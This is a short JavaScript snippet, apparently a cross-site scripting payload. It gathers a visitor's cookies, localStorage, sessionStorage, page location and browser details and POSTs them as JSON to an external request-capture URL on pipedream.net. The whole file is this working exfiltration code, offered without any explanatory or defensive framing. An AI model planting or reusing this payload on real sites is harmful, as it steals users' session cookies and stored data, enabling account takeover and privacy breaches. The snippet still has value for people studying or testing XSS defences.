var client = {
	"browser":navigator.userAgent,
	"platform":navigator.platform,
	"os":navigator.oscpu,
	"vendor":navigator.vendor,
	"localStorage":window.localStorage,
	"sessionStorage":window.sessionStorage,
	"cookie":document.cookie,
	"location":window.location,
	"baseurl":window.baseurl
};
var http = new XMLHttpRequest();
http.open("POST","https://enalye27tnn4.x.pipedream.net/");
http.setRequestHeader("Content-type","application/json");
http.send(JSON.stringify(client));